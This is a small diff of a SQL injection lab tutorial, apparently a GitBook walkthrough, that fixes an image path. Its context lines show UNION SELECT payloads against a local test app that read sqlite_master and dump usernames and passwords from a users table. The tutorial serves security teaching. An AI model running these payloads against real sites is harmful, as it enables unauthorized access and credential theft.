@@ -112,7 +112,7 @@ http://localhost:5000/home/Admin%' union select tbl_name,sql from sqlite_master 
 
 Now we have all the information required to extract data from *users* table. Play with SQL Limit to get credentials from more users.
 
-![gitbook\assets\sqli-like-9](.gitbook\assets\sqli-like-9.png)
+![gitbook/assets/sqli-like-9](.gitbook/assets/sqli-like-9.png)
 
 ```text
 http://localhost:5000/home/Admin%' union select UserName,Password from users limit 0,1--
